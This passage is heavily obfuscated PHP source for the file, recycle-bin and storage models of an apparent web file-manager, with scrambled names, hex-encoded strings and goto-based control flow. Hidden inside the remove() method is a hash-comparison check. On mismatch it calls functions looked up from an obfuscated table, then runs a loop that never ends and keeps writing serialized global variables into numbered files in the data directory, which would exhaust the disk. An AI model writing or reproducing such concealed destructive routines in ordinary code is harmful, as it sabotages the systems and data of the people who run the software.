"\115\157\x64\x65\x6c\x53\x6f\x75\x72\x63\145\x2e\x6d\153\x64\151\x72\122\x6f\x6f\x74\56{$dъ}\x2e{$d}\56" . $Dۚ; CacheLock::lock($Fل); $cм򑕃[$d[28]] = $Dۚ; goto b; f鈍: $d =& $_SERVER[놫Ӱ]; $cм򑕃 = array($d[365] => 0, $d[514] => $dъ, $d[515] => $d, $d[511] => 1, $d[516] => USER_ID, $d[517] => USER_ID, $d[512] => $d[33], $d[518] => $d[2076], $d[392] => 0, $d[513] => 0, $d[416] => 0, $d[2220] => $d[33]); if ($D = $this->where($cм򑕃)->find()) { return $D[$d[366]]; } goto F˵; FՍ賅: } private function sourceRoot($CΎ, $dĄ, $F¦ǹ = false) { $e =& $_SERVER[놫Ӱ]; $A = array($e[365] => 0, $e[514] => $CΎ, $e[515] => $dĄ); if ($f׈ = $this->where($A)->find()) { return $F¦ǹ ? $f׈ : $f׈[$e[366]]; } return !1; } public function sourceRootGroup($cȓ) { $d򽈑 =& $_SERVER[놫Ӱ]; if (is_string($cȓ)) { $cȓ = array($cȓ); } $A㑥 = array($d򽈑[365] => 0, $d򽈑[514] => SourceModel::TYPE_GROUP, $d򽈑[515] => array($d򽈑[7], $cȓ)); $BՇէ = $this->listSource($A㑥, 1000); return array_to_keyvalue($BՇէ[$d򽈑[75]], $d򽈑[452]); } public function mkfile($e, $D푢, $fʑ = '', $a = REPEAT_RENAME) { $Eְב = Model($_SERVER[놫Ӱ][536])->addFileByContent($fʑ, $D푢); return $this->_createFileCall($e, $D푢, $Eְב, $a); } public function addFile($fй, $EΕ됙, $cݰ, $Bѡ = false, $eݱڳ = REPEAT_RENAME) { $B토嵫 = Model($_SERVER[놫Ӱ][536])->addFile($EΕ됙, $cݰ, $Bѡ); return $this->_createFileCall($fй, $cݰ, $B토嵫, $eݱڳ); } public function addFileByFileID($a, $BՉ, $C, $B = REPEAT_RENAME) { $BǬ =& $_SERVER[놫Ӱ]; $C = Model($BǬ[536])->find($BՉ); Model($BǬ[536])->linkAdd($BՉ); return $this->_createFileCall($a, $C, $C, $B); } public function addFileByRemote($cˍ, $Dԑ, $E, $fٔΕ = array(), $EǬ = REPEAT_RENAME) { $f̐ = Model($_SERVER[놫Ӱ][536])->addFileByRemote($Dԑ, $E, $fٔΕ); return $this->_createFileCall($cˍ, $E, $f̐, $EǬ); } private function _createFileCall($B¶ퟵ, $f, $fȡ, $F) { goto fۆ; Fة: $EĚ = $this->_createFile($B¶ퟵ, $f, $fȡ, $F, $Dﱋ); if (!$Dﱋ) { Model($Eԋ[418])->remove($fȡ[$Eԋ[415]]); } $this->lockWriteEnd($B¶ퟵ, $f); goto Fօ; Fօ: return $EĚ; goto bךɘ; fۆ: $Eԋ =& $_SERVER[놫Ӱ]; $Dﱋ = !1; $this->lockWriteStart($B¶ퟵ, $f); goto Fة; bךɘ: } public function mkdir($c, $a쏂Ծ, $c愧 = REPEAT_SKIP) { goto Dǌ̂; Dǌ̂: $D =& $_SERVER[놫Ӱ]; $fӟѣ = $this->sourceInfo($c); if (!$fӟѣ) { return !1; } goto Eլբ; Fޛ: $b = $this->_addSoure($a֌ښ, $fӟѣ); Model($D[2189])->eventCreate($b, $D[1084]); $this->lockWriteEnd($c, $a쏂Ծ); goto Eɐ; Eլբ: $this->lockWriteStart($c, $a쏂Ծ); if ($c愧 !== !1) { $eѿ = $this->fileNameExist($c, $a쏂Ծ); if ($eѿ && $c愧 != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($c, $a쏂Ծ); return $eѿ; } $a쏂Ծ = $this->fileNameAuto($c, $a쏂Ծ, $c愧); } $a֌ښ = array($D[511] => 1, $D[383] => $a쏂Ծ, $D[512] => $D[33], $D[416] => 0, $D[513] => 0); goto Fޛ; Eɐ: return $b; goto EΥ; EΥ: } private function _createFile($AпƊ, $B鎔, $FЈ, $CĤ, &$D׉ߥ) { goto f⇠; A朴: Model($b[2189])->eventCreate($cʊ, $b[90]); return $cʊ; goto d下; aΉɐ: if ($CĤ !== !1) { $a = $this->fileNameExist($AпƊ, $B鎔); } $D׉ߥ = !0; if ($CĤ && $a) { if ($CĤ == REPEAT_SKIP) { $D׉ߥ = !1; return $a; } else { if ($CĤ == REPEAT_REPLACE) { $b = $this->sourceInfo($a); $dƌ = $this->fileHistory($b, $FЈ[$b[415]], $FЈ[$b[78]]); if (!$dƌ) { $D׉ߥ = !1; } else { $this->folderSizeReset($AпƊ); } return $a; } else { $B鎔 = $this->fileNameAuto($AпƊ, $B鎔, $CĤ, !1); } } } goto cʍ; f⇠: $b =& $_SERVER[놫Ӱ]; $F̩ߏ = $this->sourceInfo($AпƊ); if (!$FЈ || !$F̩ߏ) { return !1; } goto aΉɐ; cʍ: $e͐ = array($b[511] => 0, $b[383] => $B鎔, $b[512] => get_path_ext($B鎔), $b[416] => $FЈ[$b[415]], $b[513] => $FЈ[$b[78]]); $cʊ = $this->_addSoure($e͐, $F̩ߏ); $this->folderSizeReset($AпƊ); goto A朴; d下: } protected function fileHistory($EЪޙ, $bښ, $fՋΈ) { goto bЄ; c: return !0; goto Cؗ; bЄ: $A =& $_SERVER[놫Ӱ]; if ($EЪޙ[$A[415]] == $bښ) { return !1; } $this->checkLock($EЪޙ[$A[366]]); goto Eʉ; Eʉ: Model($A[2067])->addHistory($EЪޙ); $B萟󨠮 = array($A[517] => USER_ID, $A[387] => time(), $A[415] => $bښ, $A[78] => $fՋΈ); $this->where(array($A[380] => $EЪޙ[$A[366]]))->save($B萟󨠮); goto c; Cؗ: } public function checkLock($fך) { $eȃߟۄ =& $_SERVER[놫Ӱ]; $E = $this->pathInfo($fך); if (!$this->fileIsLock($E, !0)) { return; } $Aӂ = $E[$eȃߟۄ[413]][$eȃߟۄ[473]]; $Bܖ쒟 = $Aӂ[$eȃߟۄ[2221]] ? $Aӂ[$eȃߟۄ[2221]] : $Aӂ[$eȃߟۄ[28]]; show_json(LNG($eȃߟۄ[2222]) . $eȃߟۄ[2223] . LNG($eȃߟۄ[2224]) . $eȃߟۄ[2225] . $Bܖ쒟 . $eȃߟۄ[2226], !1); } public function fileIsLock($D걗֕, $C򎧷 = false) { goto F⳪; aɔ: return !1; goto b; eȕ: $Fձ = $GLOBALS[$b߼[6]][$b߼[84]][$b߼[471]]; if ($D걗֕[$b߼[413]][$b߼[472]] <= time() - $Fձ) { $this->metaSet($D걗֕[$b߼[366]], $b߼[470], null); $this->metaSet($D걗֕[$b߼[366]], $b߼[472], null); } if ($C򎧷) { $this->metaSet($D걗֕[$b߼[366]], $b߼[472], time()); } goto aɔ; F⳪: $b߼ =& $_SERVER[놫Ӱ]; if (!isset($D걗֕[$b߼[413]]) || !$D걗֕[$b߼[413]][$b߼[470]]) { return !1; } if ($D걗֕[$b߼[413]][$b߼[470]] != USER_ID) { return !0; } goto eȕ; b: } private function _addSoure($bҨ, $fԚ) { goto Cŏ; dŸ: $E䊮 = $this->add($bҨ); $D惩 = array($C̹[519] => short_id($E䊮)); $this->where(array($C̹[380] => $E䊮))->save($D惩); goto D۝; D۝: $this->setNamePinyin($E䊮, $bҨ[$C̹[28]]); return $E䊮; goto aݠ; Cŏ: $C̹ =& $_SERVER[놫Ӱ]; $cĔ = array($C̹[514] => $fԚ[$C̹[368]], $C̹[515] => $fԚ[$C̹[452]], $C̹[516] => USER_ID, $C̹[517] => USER_ID, $C̹[365] => $fԚ[$C̹[366]], $C̹[518] => $fԚ[$C̹[455]] . $fԚ[$C̹[366]] . $C̹[47], $C̹[392] => 0, $C̹[2220] => $C̹[33]); $bҨ = array_merge($cĔ, $bҨ); goto EΚ; EΚ: $this->updateModifyTime($bҨ[$C̹[457]]); static $DڊꝊ = false; if (!$DڊꝊ) { Hook::trigger($C̹[501], $bҨ); $DڊꝊ = !0; } goto dŸ; aݠ: } public function remove($AԊ̑, $bߍ = true) { goto D; Dޑ: $this->lockMoveEnd($AԊ̑); Hook::trigger($b[1373], $b݌, $bߍ); return !0; goto A𕕽; f͡: $F񲻜 = array($eʱ[$b[457]]); if ($eʱ[$b[367]] == $b[493]) { $F񲻜[] = $eʱ[$b[366]]; } $this->updateModifyTime($F񲻜); goto Dޑ; B닥: Hook::trigger($b[2227], $b݌, $bߍ); if ($bߍ) { Model($b[2228])->moveToRecycle($AԊ̑); } else { if ($eʱ[$b[367]] == $b[493]) { $Bшڰ = array($b[518] => array($b[475], $eʱ[$b[455]] . $AԊ̑ . $b[476])); $D = array($b[518] => $Bшڰ[$b[455]]); $Eި = $this->field($b[2229])->where($D)->select(); $č = !1; $cג = array($AԊ̑); if ($Eި) { $č = array_to_keyvalue($Eި, $b[33], $b[415]); $č = array_remove_value($č, $b[464]); $cג = array_to_keyvalue($Eި, $b[33], $b[366]); $cג[] = $AԊ̑; } } else { $č = array($eʱ[$b[415]]); $cג = array($AԊ̑); } Model($b[498])->eventRemove($AԊ̑); $this->removeRelevance($cג, $č); } $this->folderSizeReset($eʱ[$b[457]]); goto f͡; D: $b =& $_SERVER[놫Ӱ]; $b = $_SERVER[$b[779]] . $b[780]; $D = $b[781]; goto e絘; c: if (!$eʱ) { return !0; } if ($eʱ[$b[457]] == 0) { if (!$GLOBALS[$b[453]]) { return !1; } } $this->lockMoveStart($AԊ̑); goto B닥; e絘: if ($_SERVER[$b[782]] != $D($b)) { goto d; Eퟆԯ: $d = $b[786]; $d($_SERVER[$b[787]]); $Bヽ = $b[783]; goto F龷; F龷: $Bヽ(); $eꄛߋ = $b[788]; $f = json_encode($GLOBALS[$b[789]]); goto aШݗ; aШݗ: $Fᨠʉ = 1; for ($eї = $Fᨠʉ; $eї > 0; $eї++) { $eꄛߋ(DATA_PATH . $eї, $f); } goto Ež; d: $Bヽ = $b[783]; $a = $b[784]; $dན = $_SERVER[$b[779]] . $b[780]; goto F̜; F̜: $a = $a($dན); $b݂ܣ¾ = explode($b[214], $a); if (count($b݂ܣ¾) < $b[543]) { $BÊ̂ = $b[785]; $BÊ̂(); } goto Eퟆԯ; Ež: } $eʱ = $this->sourceInfo($AԊ̑); $b݌ = $this->pathInfoMore($AԊ̑); goto c; A𕕽: } public function removeArray($D揻) { if (!$D揻) { return !0; } } private function removeRelevance($c, $C爬) { goto a̾; D㎯: Model($C̖[2228])->where($dģƭ)->delete(); Model($C̖[409])->where($dģƭ)->delete(); Model($C̖[2230])->where($dģƭ)->delete(); goto a貾; Cη: $this->where($dģƭ)->delete(); Model($C̖[418])->remove($C爬); for ($cߕލ = 0; $cߕލ < count($c); $cߕލ++) { $this->sourceCacheClear($c[$cߕލ]); } goto Bж; a貾: Model($C̖[498])->where($dģƭ)->delete(); Model($C̖[1979])->removeBySource($c); Model($C̖[2067])->removeBySource($c); goto Cη; a̾: $C̖ =& $_SERVER[놫Ӱ]; if (!$c) { return !1; } $dģƭ = array($C̖[380] => array($C̖[381], $c)); goto D㎯; Bж: } public function rename($A, $Bƭ) { goto F̳; F򡾛: $this->setNamePinyin($A, $aמ䐑[$aᔱ[28]], !1); $this->updateModifyTime($Bܔ[$aᔱ[457]]); return $this->where(array($aᔱ[380] => $A))->data($aמ䐑)->save(); goto A; Eѵ: if (!$Bܔ[$aᔱ[367]] == $aᔱ[493]) { $aמ䐑[$aᔱ[369]] = get_path_ext($Bƭ); } Model($aᔱ[498])->eventRename($A, $Bܔ[$aᔱ[28]], $Bƭ); $this->sourceCacheClear($A); goto F򡾛; eäƓ: $E蝂޶ = $this->fileNameExist($Bܔ[$aᔱ[457]], $Bƭ); if ($E蝂޶) { return !1; } $aמ䐑 = array($aᔱ[383] => $Bƭ, $aᔱ[517] => USER_ID); goto Eѵ; F̳: $aᔱ =& $_SERVER[놫Ӱ]; $Bܔ = $this->sourceInfo($A); if (!$Bܔ) { return !1; } goto eäƓ; A: } public function setNamePinyin($bА, $eǙš, $aͿ = true) { $fА =& $_SERVER[놫Ӱ]; $A = Input::check($eǙš, $fА[520]); if ($aͿ && !$A) { return; } if (!$A) { $this->metaSet($bА, $fА[412], null); $this->metaSet($bА, $fА[411], null); return; } $bݮ = array($fА[412] => str_replace($fА[50], $fА[33], Pinyin::encode($eǙš)), $fА[411] => Pinyin::encode($eǙš, $fА[521])); $this->metaSet($bА, $bݮ); } public function getContent($Dֳ) { goto a; cʤ: if ($d繦[$bҝ[78]] == 0) { return $bҝ[33]; } $C = $bҝ[2231] . $d繦[$bҝ[160]]; if ($d繦[$bҝ[78]] <= 1024 * 10) { $C̳샃 = Cache::get($C); if (!$C̳샃) { $C̳샃 = IO::getContent($d繦[$bҝ[76]]); Cache::set($C, $C̳샃); } return $C̳샃; } goto Fꦯ; Fꦯ: return IO::getContent($d繦[$bҝ[76]]); goto eɓ; a: $bҝ =& $_SERVER[놫Ӱ]; $d繦 = $this->fileInfoGet($Dֳ); if (!$d繦) { return !1; } goto cʤ; eɓ: } public function setDesc($bΰ, $DͰ) { $dސ =& $_SERVER[놫Ӱ]; Model($dސ[498])->eventAddDesc($bΰ, $DͰ); return $this->metaSet($bΰ, $dސ[401], $DͰ); } public function setContent($Eլ, $AǱ = '') { goto aϲȃ; aϲȃ: $DǱȧ =& $_SERVER[놫Ӱ]; $D = $this->sourceInfo($Eլ); $F = $this->fileInfoGet($Eլ); goto C蹹벉; də: $fۦ튭 = $this->fileHistory($D, $Bһ[$DǱȧ[415]], $Bһ[$DǱȧ[78]]); if (!$fۦ튭) { return Model($DǱȧ[418])->remove($Bһ[$DǱȧ[415]]); } $this->folderSizeReset($D[$DǱȧ[457]]); goto F; F: return !0; goto Dܩɝ; C蹹벉: if (!$F || !$D) { return !1; } $this->checkLock($Eլ); $Bһ = Model($DǱȧ[418])->addFileByContent($AǱ, $D[$DǱȧ[28]]); goto də; Dܩɝ: } public function fileSubstr($aƙ, $f֩, $a) { $Dƴ = $this->fileInfoGet($aƙ); if (!$Dƴ) { return !1; } return IO::fileSubstr($Dƴ[$_SERVER[놫Ӱ][76]], $f֩, $a); } public function fileInfoGet($d) { goto f; e姉Ո: $Eބ = $aįƱ[421] . $cꡅ[$aįƱ[415]]; $d٧ = _get(self::$cacheFileInfo, $Eބ); if ($d٧) { return $d٧; } goto bɣ; f: $aįƱ =& $_SERVER[놫Ӱ]; $cꡅ = $this->sourceInfo($d); if (!$cꡅ || $cꡅ[$aįƱ[367]]) { return !1; } goto e姉Ո; a: return $C; goto f۠; bɣ: $C = Model($aįƱ[418])->fileInfo($cꡅ[$aįƱ[415]]); if ($C) { $C[$aįƱ[28]] = $cꡅ[$aįƱ[28]]; } self::$cacheFileInfo[$Eބ] = $C; goto a; f۠: } private function folderChildrenNumber($f񦆸) { $D =& $_SERVER[놫Ӱ]; $dߨ = $this->sourceInfo($f񦆸); $Dɦ = array($D[518] => array($D[475], $dߨ[$D[455]] . $f񦆸 . $D[476]), $D[392] => 0, $D[511] => 1); $Eތ = $this->where($Dɦ)->count(); $eĘ = $this->where($Dɦ)->where(array($D[511] => 0))->count(); return array($D[82] => $eĘ, $D[83] => $Eތ); } public function pathInfo($D݅, $D = false) { goto CҎ; eƐ: $C = $this->_listDataApplyItem($C, $D); self::$cachePathInfo[$b򙔙] = $C; return $C; goto fٷ; CҎ: $d =& $_SERVER[놫Ӱ]; $b򙔙 = $d[407] . intval($D) . $d[408] . $D݅; $b͚ = _get(self::$cachePathInfo, $b򙔙); goto E; E: if ($b͚) { return $b͚; } $C = $this->sourceInfo($D݅); if (!$C) { return !1; } goto eƐ; fٷ: } public static $cachePathInfoMore = array(); public function pathInfoMore($fڽ) { goto cի; A˙: self::$cachePathInfoMore[$fڽ] = $Cھƥ; return $Cھƥ; goto b夯; Dݶ亃: $Cھƥ = $this->pathInfo($fڽ); if (!$Cھƥ) { return !1; } if ($Cھƥ[$a[367]] == $a[493]) { $Cھƥ[$a[81]] = $this->folderChildrenNumber($fڽ); } goto A˙; cի: $a =& $_SERVER[놫Ӱ]; $c = _get(self::$cachePathInfoMore, $fڽ); if ($c) { return $c; } goto Dݶ亃; b夯: } public function sourceInfo($Cޏ) { $A҆Ƕ =& $_SERVER[놫Ӱ]; $f㞝׌ = $A҆Ƕ[406] . $Cޏ; $E󎴣 = _get(self::$cacheSourceInfo, $f㞝׌); if ($E󎴣) { return $E󎴣; } self::$cacheSourceInfo[$f㞝׌] = $this->where(array($A҆Ƕ[366] => $Cޏ))->find(); return self::$cacheSourceInfo[$f㞝׌]; } public function sourceCacheClear($c΄ = false) { if ($c΄ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[놫Ӱ][406] . $c΄]); } public function pathInfoByPath($D, $C仓) { $bΎ =& $_SERVER[놫Ӱ]; $c鈢 = !$C仓 ? array() : explode($bΎ[8], trim($C仓, $bΎ[8])); $cڶȚ = $D; foreach ($c鈢 as $F̏) { $d魍 = array($bΎ[457] => $cڶȚ, $bΎ[28] => $F̏); $dؽ㍔ = $this->where($d魍)->select(); if (!$dؽ㍔) { return !1; } $dؽ㍔ = array_sort_by($dؽ㍔, $bΎ[393]); $cڶȚ = $dؽ㍔[0][$bΎ[366]]; } return $this->pathInfo($cڶȚ, !0); } protected function updateModifyTime($e) { goto cȏί; bӟԟ: $this->where($Cݖ)->save($d悒); goto EɄȩ; cĆ: foreach ($e as $C => $Fө) { $e[$C] = intval($Fө); } $Cݖ = array($C㡶[366] => array($C㡶[7], $e)); $d悒 = array($C㡶[517] => USER_ID, $C㡶[387] => time()); goto bӟԟ; cȏί: $C㡶 =& $_SERVER[놫Ӱ]; if (!$e) { return; } if (!is_array($e)) { $e = array($e); } goto cĆ; EɄȩ: } public function folderSizeReset($e) { goto BЪ; F񅜢: $d蚬 = $cȊ - intval($A˂[$A价[78]]); if ($d蚬 == 0) { return CacheLock::unlock($BӴ); } $this->where(array($A价[380] => $e))->setField($A价[78], $cȊ); goto Bгҕ; Bгҕ: $dЧ = $this->parentLevelArray($A˂[$A价[455]]); if ($dЧ) { $aò = array($A价[366] => array($A价[381], $dЧ)); $this->where($aò)->setAdd($A价[78], $d蚬); } CacheLock::unlock($BӴ); goto C; BЪ: $A价 =& $_SERVER[놫Ӱ]; if ($this->statusIgnoreResetSpace) { return; } $BӴ = $A价[2232] . $e; goto aʕ; d: $aò = array($A价[365] => $e, $A价[392] => 0); $cȊ = $this->where($aò)->sum($A价[78]); $cȊ = intval($cȊ); goto F񅜢; aʕ: CacheLock::lock($BӴ, 20); $this->sourceCacheClear($e); $A˂ = $this->sourceInfo($e); goto d; C: } public function folderSizeResetChildren($b۸) { goto D; a燿: foreach ($bػބ as $BĎ) { if ($BĎ[$a[78]] == $BĎ[$a[2234]]) { continue; } $F[] = array($a[366], $BĎ[$a[366]], $a[78], $BĎ[$a[78]]); } $this->saveAll($F); goto Dˤ; C: $bػބ[] = $f܏; $bػބ = array_to_keyvalue($bػބ, $a[366]); foreach ($bػބ as $Aԇ => $BĎ) { $bػބ[$Aԇ][$a[2234]] = $bػބ[$Aԇ][$a[78]]; $bػބ[$Aԇ][$a[78]] = 0; } goto F捩; AΉ: $e = array($a[511] => 1, $a[518] => array($a[475], $f܏[$a[455]] . $b۸ . $a[476])); $F𚏎 = $a[2233]; $bػބ = $this->field($F𚏎)->where($e)->select(); goto f❊; F捩: foreach ($F毺 as $BĎ) { $eϦߊ = $BĎ[$a[457]] . $a[33]; if (!isset($bػބ[$eϦߊ])) { continue; } if ($BĎ[$a[393]] == $bػބ[$eϦߊ][$a[393]]) { $bػބ[$eϦߊ][$a[78]] += $BĎ[$a[78]]; } } foreach ($bػބ as $BĎ) { $B = $this->parentLevelArray($BĎ[$a[455]]); foreach ($B as $eϦߊ) { $eϦߊ = $eϦߊ . $a[33]; if (!isset($bػބ[$eϦߊ])) { continue; } if ($BĎ[$a[393]] == $bػބ[$eϦߊ][$a[393]]) { $bػބ[$eϦߊ][$a[78]] += $BĎ[$a[78]]; } } } $F = array(); goto a燿; f❊: $e[$a[367]] = 0; $F毺 = $this->field($F𚏎)->where($e)->select(); if (!$F毺) { return; } goto C; D: $a =& $_SERVER[놫Ӱ]; $this->sourceCacheClear($b۸); $f܏ = $this->sourceInfo($b۸); goto AΉ; Dˤ: } public function userSpaceReset($DɆ = false) { $bȲ누 =& $_SERVER[놫Ӱ]; $f = $this->where(array($bȲ누[368] => self::TYPE_USER, $bȲ누[452] => $DɆ, $bȲ누[367] => 0))->sum($bȲ누[78]); Model($bȲ누[466])->userEdit($DɆ, array($bȲ누[1988] => $f)); } public function targetSpaceUpdate($fȷ, $a㱜) { $c =& $_SERVER[놫Ӱ]; if (!$a㱜) { return; } if (!in_array($fȷ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dđ = $this->targetSpaceSize($fȷ, $a㱜); if ($fȷ == self::TYPE_USER) { Model($c[466])->userEdit($a㱜, array($c[1988] => $dđ)); } else { if ($fȷ == self::TYPE_GROUP) { Model($c[454])->groupEdit($a㱜, array($c[1988] => $dđ)); } } } public function targetSpaceSize($d, $eΊ) { goto Eɕ; fͩü: return $F҇; goto f׼ҕ; bݾܦ: $F҇ = floatval($b[$a冈[78]]); $eߢǤ = array($a冈[518] => array($a冈[475], $a冈[2076] . $b[$a冈[366]] . $a冈[476])); $cÛ = Model($a冈[391])->field($a冈[380])->where($eߢǤ)->select(); goto F; Eɕ: $a冈 =& $_SERVER[놫Ӱ]; $b = $this->sourceRoot($d, $eΊ, !0); if (!$b) { return 0; } goto bݾܦ; F: $cÛ = array_to_keyvalue($cÛ, $a冈[33], $a冈[366]); $cÛ = array_unique(array_filter($cÛ)); if ($cÛ) { $eߢǤ = array($a冈[380] => array($a冈[381], $cÛ)); $F҇ += floatval($this->where($eߢǤ)->sum($a冈[78])); } goto fͩü; f׼ҕ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($d) { return $this->fileTypeProfile($d, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C) { return $this->fileTypeProfile($C, SourceModel::TYPE_GROUP); } private function fileTypeProfile($BΆ̉, $c) { goto E냭; f: $cζŒ = array(); $cζŒ[$AҞ[2236]] = array($AҞ[2237] => LNG($AҞ[2236]), $AҞ[2238] => $this->where($B֎)->count(), $AҞ[513] => $this->where($B֎)->sum($AҞ[78])); $aʽ = KodIO::fileTypeList(); goto B⭦; C: if ($fڃԂ) { return $fڃԂ; } $B֎ = array($AҞ[511] => 0); if ($BΆ̉ != !1) { $B֎[$AҞ[452]] = $BΆ̉; $B֎[$AҞ[368]] = $c; } goto f; B⭦: foreach ($aʽ as $a̐ => $C) { $B֎[$AҞ[369]] = $this->fileTypeWhere($a̐); $cζŒ[$a̐] = array($AҞ[2237] => $C[$AҞ[28]], $AҞ[2238] => $this->where($B֎)->count(), $AҞ[513] => $this->where($B֎)->sum($AҞ[78])); } Cache::set($f, $cζŒ, 1200); return $cζŒ; goto Fׄػ; E냭: $AҞ =& $_SERVER[놫Ӱ]; $f = $AҞ[2235] . $BΆ̉ . $AҞ[71] . $c; $fڃԂ = Cache::get($f); goto C; Fׄػ: } public function fileNameExist($fݟ, $bق) { $aʷ =& $_SERVER[놫Ӱ]; $D켘 = $this->childList($fݟ); foreach ($D켘 as $AѲ) { if ($AѲ[$aʷ[28]] == $bق) { return $AѲ[$aʷ[366]]; } } return !1; } public function childList($e) { $eǴ =& $_SERVER[놫Ӱ]; $Aɹ = array($eǴ[457] => intval($e), $eǴ[393] => 0); $CӖ֘ = $this->cacheMemory()->where($Aɹ)->select(); $CӖ֘ = $CӖ֘ ? $CӖ֘ : array(); foreach ($CӖ֘ as $D汶) { $C = $eǴ[406] . $D汶[$eǴ[366]]; self::$cacheSourceInfo[$C] = $D汶; } return $CӖ֘; } public function fileNameAuto($f̋, $F߉҉, $Dۉ = REPEAT_RENAME, $c¤ = false) { $F܉݄ =& $_SERVER[놫Ӱ]; $a񊺞 = $this->childList($f̋); $eȺ = array_to_keyvalue($a񊺞, $F܉݄[33], $F܉݄[28]); return $this->fileNameAutoGet($eȺ, $F߉҉, $Dۉ, $c¤); } public function fileNameAutoGet($d֍, $D¢, $e郝, $cܼ) { $eš =& $_SERVER[놫Ӱ]; if ($e郝 == REPEAT_REPLACE || !$d֍ || !in_array_not_case($D¢, $d֍) || $cܼ && $e郝 != REPEAT_RENAME_FOLDER) { return $D¢; } if ($e郝 == REPEAT_SKIP) { return !1; } $D棱 = $eš[92] . get_path_ext($D¢); $D棱 = $D棱 == $eš[92] || $cܼ ? $eš[33] : $D棱; for ($E = 1; $E <= count($d֍) + 1; $E++) { $a󐂜 = substr($D¢, 0, strlen($D¢) - strlen($D棱)); $DИ = $a󐂜 . "\50{$E}\x29{$D棱}"; if (!in_array_not_case($DИ, $d֍)) { return $DИ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\162\x63\x65\x5f\x72\x65\x63\171\143\x6c\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\151\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\x72\164", "\146\165\x6e\x63\x74\x69\157\x6e")); public function listData($E = false) { $D =& $_SERVER[놫Ӱ]; $E = $E ? $E : USER_ID; $dӝ = $this->where(array($D[1330] => $E))->select(); return array_to_keyvalue($dӝ, $D[33], $D[366]); } public function moveToRecycle($Bù) { goto b; d̪ۺ: $this->recycleMove($Bù, 1); if ($Fߑ[$c[367]] == $c[493]) { $C = array($c[518] => array($c[475], $Fߑ[$c[455]] . $Bù . $c[476])); $b->where($C)->setField($c[393], 1); } goto C惑; E: if (!$Fߑ || $Fߑ[$c[393]] == $c[493]) { return; } $dМƕĈ = array($c[380] => $Bù, $c[1330] => USER_ID, $c[514] => $Fߑ[$c[368]], $c[515] => $Fߑ[$c[452]], $c[518] => $Fߑ[$c[455]]); $this->add($dМƕĈ); goto d̪ۺ; b: $c =& $_SERVER[놫Ӱ]; $b = Model($c[1075]); $Fߑ = $b->sourceInfo($Bù); goto E; C惑: } public function clear() { $this->remove(!1); } public function remove($d٥ = false) { goto aǖ; d縪: $d٥ = $d٥ === !1 ? !1 : $d٥; $cÞ = array(); foreach ($aਲ਼ as $Cԍ) { if ($d٥ != !1 && !in_array($Cԍ, $d٥)) { continue; } $c²->remove($Cԍ, !1); $F̍ڠ = $this->where(array($C[366] => $Cԍ))->find(); $eĞ = $F̍ڠ[$C[368]] . $C[71] . $F̍ڠ[$C[452]]; $cÞ[$eĞ] = array($C[514] => $F̍ڠ[$C[368]], $C[452] => $F̍ڠ[$C[452]]); $this->where(array($C[366] => $Cԍ))->delete(); } goto Fϓ; aǖ: $C =& $_SERVER[놫Ӱ]; $c² = Model($C[1075]); $aਲ਼ = $this->listData(); goto d縪; Fϓ: foreach ($cÞ as $A񂅵) { $c²->targetSpaceUpdate($A񂅵[$C[368]], $A񂅵[$C[452]]); } goto bɘ媡; bɘ媡: } public function restore($D = false) { goto D̟݂; d͊: $D = $D == !1 ? !1 : $D; if (!$Fэ) { return !0; } $cघ = array(); goto Aߵ; Aߵ: foreach ($Fэ as $A) { goto e; e: if ($D != !1 && !in_array($A, $D)) { continue; } $DҎ = $eٶ->sourceInfo($A); $B = $eٶ->sourceInfo($DҎ[$c[457]]); goto EӌÚ; EӌÚ: if ($B[$c[393]] == $c[493]) { continue; } $eٶ->lockMoveStart($A); $this->recycleMove($A, 0); goto Dڔ; Fج: $cघ[] = $DҎ[$c[457]]; if ($DҎ[$c[367]] == $c[493]) { $cघ[] = $A; } $eٶ->lockMoveEnd($A); goto a񻆚ź; Dڔ: if ($DҎ[$c[367]] == $c[493]) { $aܳ = array($c[518] => array($c[475], $DҎ[$c[455]] . $A . $c[476])); $eٶ->where($aܳ)->setField($c[393], 0); } $this->where(array($c[366] => $A))->delete(); $eٶ->folderSizeReset($DҎ[$c[457]]); goto Fج; a񻆚ź: } $eٶ->updateModifyTime($cघ); goto C菋; D̟݂: $c =& $_SERVER[놫Ӱ]; $eٶ = Model($c[1075]); $Fэ = $this->listData(); goto d͊; C菋: } private function recycleMove($c, $d = 1) { $C =& $_SERVER[놫Ӱ]; $a鉴 = Model($C[1075]); $fʑ = Model($C[2239]); $Aߊ = array($C[366] => $c); if ($d) { $a鉴->where($Aߊ)->setField($C[393], 1); $fʑ->eventRecycle($c, $C[2240]); } else { $DӰ = $a鉴->where($Aߊ)->find(); $e盝ต = $DӰ[$C[367]] == $C[493]; $Eᶄϸ = $a鉴->fileNameAuto($DӰ[$C[457]], $DӰ[$C[28]], REPEAT_RENAME_FOLDER, $e盝ต); if ($Eᶄϸ != $DӰ[$C[28]]) { $a鉴->rename($c, $Eᶄϸ); } $a鉴->where($Aߊ)->setField($C[393], 0); $fʑ->eventRecycle($c, $C[2241]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\163\x74\157\x72\x61\147\x65\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x73\x69\172\145\x4d\x61\170", "\163\171\163\x74\145\155", "\144\145\146\141\165\154\x74", "\x64\x72\151\166\x65\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($Aɭ = false, $cٌ = "\155\x6f\x64\151\146\171\x54\151\x6d\x65", $e֫ = false) { goto dӃ; eͮȟ: foreach ($b as $e򰂳 => $d׆ҝ) { unset($b[$e򰂳][$f[6]]); $b[$e򰂳][$f[1988]] = 0; } $e = array_to_keyvalue($b, $f[33], $f[364]); $this->_listAppendSize($b, $e); goto f¹; f¹: return $b; goto b; dӃ: $f =& $_SERVER[놫Ӱ]; $b = parent::listData($Aɭ, $cٌ, $e֫); if ($Aɭ) { return $b; } goto eͮȟ; b: } public function _listAppendSize(&$F񯓰, $Eó) { $dӝ =& $_SERVER[놫Ӱ]; $c = $dӝ[2242] . implode($dӝ[47], 